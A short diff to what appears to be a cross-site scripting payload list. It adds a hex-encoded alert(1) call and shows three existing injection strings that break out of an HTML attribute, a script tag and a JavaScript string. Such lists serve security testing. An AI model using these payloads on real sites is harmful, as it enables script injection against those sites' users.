@@ -1,4 +1,4 @@
-
+function("\x61\x6c\x65\x72\x74\x28\x31\x29")();
 "onmouseover="alert(1)
 </script><script>alert(1)</script>
 \'-alert(1)//
